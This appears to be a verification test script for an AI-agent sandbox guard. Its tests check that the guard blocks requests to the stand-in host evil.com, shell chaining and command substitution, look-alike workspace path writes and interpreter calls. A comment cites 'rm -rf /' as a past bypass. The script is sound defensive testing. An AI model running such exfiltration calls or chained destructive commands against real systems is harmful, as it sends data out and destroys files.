import sys
import os
import subprocess
import shutil
import requests
import urllib.request as urllib_request
import http.client as http_client
from pathlib import Path
import builtins

# Add src to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import src.core as core
from src.core import (
    activate_sentinel,
    deactivate_sentinel,
    set_approval_handler,
    clear_approval_handler,
)
from src.policy import PolicyEnforcer

activate_sentinel()

print("--- 🛡️ VERIFICATION START ---")

fake_workspace_dir = Path(os.path.abspath("./workspace_fake"))

# TEST 1: The "Fake Workspace" Attack
# Old Vulnerability: allowed_path="./workspace" matched "./workspace_fake"
print("\n[TEST 1] Testing Path Traversal (Fake Workspace)...")
fake_path = fake_workspace_dir / "secret.txt"
try:
    # Ensure directory exists for the test to be valid logic-wise
    os.makedirs(os.path.dirname(str(fake_path)), exist_ok=True)
    with open(str(fake_path), "w") as f:
        f.write("I should not be able to write here.")
    print("❌ FAILED: Agent wrote to fake workspace!")
except Exception as e:
    print(f"✅ PASSED: Blocked write to {fake_path}")
    print(f"   Reason: {e}")

# TEST 2: The "Shell Chaining" Attack
# Old Vulnerability: "ls && rm -rf /" passed because it started with "ls"
print("\n[TEST 2] Testing Shell Injection (&& chaining)...")
try:
    subprocess.run("ls && echo 'Hacked'", shell=True)
    print("❌ FAILED: Shell chaining executed!")
except Exception as e:
    print(f"✅ PASSED: Blocked shell chaining.")
    print(f"   Reason: {e}")

# TEST 3: subprocess.Popen interception
print("\n[TEST 3] Testing subprocess.Popen interception...")
try:
    subprocess.Popen("ls && echo 'Hacked'", shell=True)
    print("❌ FAILED: subprocess.Popen chaining executed!")
except Exception as e:
    print("✅ PASSED: Blocked subprocess.Popen chaining.")
    print(f"   Reason: {e}")

# TEST 4: os.system interception
print("\n[TEST 4] Testing os.system interception...")
try:
    os.system("ls && echo 'Hacked'")
    print("❌ FAILED: os.system chaining executed!")
except Exception as e:
    print("✅ PASSED: Blocked os.system chaining.")
    print(f"   Reason: {e}")

# TEST 5: requests.post interception
print("\n[TEST 5] Testing requests.post network interception...")
try:
    requests.post("http://evil.com", json={"x": 1})
    print("❌ FAILED: requests.post to blocked host executed!")
except Exception as e:
    print("✅ PASSED: Blocked requests.post to disallowed host.")
    print(f"   Reason: {e}")

# TEST 5B: urllib interception
print("\n[TEST 5B] Testing urllib.request interception...")
try:
    urllib_request.urlopen("http://evil.com", timeout=1)
    print("❌ FAILED: urllib.request to blocked host executed!")
except Exception as e:
    print("✅ PASSED: Blocked urllib.request to disallowed host.")
    print(f"   Reason: {e}")

# TEST 5C: http.client interception
print("\n[TEST 5C] Testing http.client interception...")
conn = http_client.HTTPConnection("evil.com", timeout=1)
try:
    conn.request("GET", "/")
    print("❌ FAILED: http.client request to blocked host executed!")
except Exception as e:
    print("✅ PASSED: Blocked http.client request to disallowed host.")
    print(f"   Reason: {e}")
finally:
    conn.close()

# TEST 6: shell-aware parsing should allow quoted operator characters
print("\n[TEST 6] Testing quoted shell operators are not misdetected...")
try:
    subprocess.run('echo "a|b"', shell=True, check=True, capture_output=True, text=True)
    print("✅ PASSED: Quoted pipe character allowed.")
except Exception as e:
    print(f"❌ FAILED: Quoted pipe was incorrectly blocked: {e}")

# TEST 7: list-form command with shell=False should not treat && as shell chain
print("\n[TEST 7] Testing argv mode does not over-block symbolic args...")
try:
    subprocess.run(["echo", "a&&b"], shell=False, check=True, capture_output=True, text=True)
    print("✅ PASSED: argv mode allowed symbolic argument.")
except Exception as e:
    print(f"❌ FAILED: argv mode incorrectly blocked symbolic arg: {e}")

# TEST 7B: command substitution should be blocked for shell=True
print("\n[TEST 7B] Testing command substitution with $() is blocked...")
try:
    subprocess.run("echo $(echo hacked)", shell=True, check=True, capture_output=True, text=True)
    print("❌ FAILED: Command substitution via $() executed!")
except Exception as e:
    print("✅ PASSED: Blocked command substitution via $().")
    print(f"   Reason: {e}")

# TEST 7C: backtick substitution should be blocked for shell=True
print("\n[TEST 7C] Testing command substitution with backticks is blocked...")
try:
    subprocess.run("echo `echo hacked`", shell=True, check=True, capture_output=True, text=True)
    print("❌ FAILED: Command substitution via backticks executed!")
except Exception as e:
    print("✅ PASSED: Blocked command substitution via backticks.")
    print(f"   Reason: {e}")

# TEST 7D: fail-safe should block interpreters even if misconfigured as allowed
print("\n[TEST 7D] Testing fail-safe blocks interpreter base commands...")
try:
    enforcer = PolicyEnforcer()
    enforcer.policy.setdefault("allowed_commands", [])
    if "python" not in enforcer.policy["allowed_commands"]:
        enforcer.policy["allowed_commands"].append("python")
    enforcer.check_command(["python", "-c", "print('ok')"], shell=False)
    print("❌ FAILED: Interpreter command allowed after accidental whitelist!")
except Exception as e:
    print("✅ PASSED: Fail-safe blocked interpreter command despite whitelist.")
    print(f"   Reason: {e}")

# TEST 8: policy loading should not depend on current working directory
print("\n[TEST 8] Testing CWD-independent policy loading...")
original_cwd = os.getcwd()
try:
    os.chdir(Path(__file__).resolve().parents[2])
    enforcer = PolicyEnforcer()
    if enforcer.policy.get("allowed_paths"):
        print("✅ PASSED: Policy loaded correctly outside sentinel-guard CWD.")
    else:
        print("❌ FAILED: Policy loaded empty outside sentinel-guard CWD.")
finally:
    os.chdir(original_cwd)

# TEST 9: activation idempotency
print("\n[TEST 9] Testing activate_sentinel idempotency...")
before_open = builtins.open
before_run = subprocess.run
before_session_request = requests.sessions.Session.request
activate_sentinel()
after_open = builtins.open
after_run = subprocess.run
after_session_request = requests.sessions.Session.request
if before_open is after_open and before_run is after_run and before_session_request is after_session_request:
    print("✅ PASSED: Repeated activation does not stack/replace patches.")
else:
    print("❌ FAILED: Repeated activation changed patched function references.")

# TEST 10: deactivation restores original runtime behavior
print("\n[TEST 10] Testing deactivate_sentinel restoration...")
deactivate_sentinel()
restored = (
    builtins.open is core._original_open
    and subprocess.run is core._original_run
    and subprocess.Popen is core._original_popen
    and os.system is core._original_os_system
    and requests.sessions.Session.request is core._original_session_request
)
if not restored:
    print("❌ FAILED: Deactivation did not restore all original functions.")
else:
    print("✅ PASSED: Deactivation restored original runtime functions.")
    try:
        # 'pwd' is not whitelisted while sentinel is active; this should run when deactivated.
        subprocess.run("pwd", shell=True, check=True, capture_output=True, text=True)
        print("✅ PASSED: Command execution no longer intercepted after deactivation.")
    except Exception as e:
        print(f"❌ FAILED: Command still appears intercepted after deactivation: {e}")

# Reactivate so script finishes in a protected state for consistency.
activate_sentinel()

# TEST 11: approval workflow for blocked file access
print("\n[TEST 11] Testing approval workflow for blocked file access...")
approval_test_path = fake_workspace_dir / "approved_by_user.txt"
set_approval_handler(lambda alert: alert.action == "file_access")
try:
    os.makedirs(os.path.dirname(str(approval_test_path)), exist_ok=True)
    with open(str(approval_test_path), "w") as f:
        f.write("approved")
    print("✅ PASSED: User approval allowed blocked file access.")
except Exception as e:
    print(f"❌ FAILED: Approved file access was still blocked: {e}")
finally:
    clear_approval_handler()

# Confirm default behavior returns to block after handler is cleared
print("\n[TEST 12] Testing default rejection when approval handler is cleared...")
try:
    with open(str(fake_workspace_dir / "should_block_again.txt"), "w") as f:
        f.write("blocked")
    print("❌ FAILED: File access was allowed without approval handler!")
except Exception as e:
    print("✅ PASSED: File access blocked again after clearing handler.")
    print(f"   Reason: {e}")

# Teardown: cleanup test artifact if it exists.
if fake_workspace_dir.exists() and fake_workspace_dir.is_dir():
    try:
        shutil.rmtree(fake_workspace_dir)
        print(f"\n[TEARDOWN] Removed test artifact: {fake_workspace_dir}")
    except Exception as e:
        print(f"\n[TEARDOWN] Could not remove {fake_workspace_dir}: {e}")

print("\n--- 🛡️ VERIFICATION END ---")
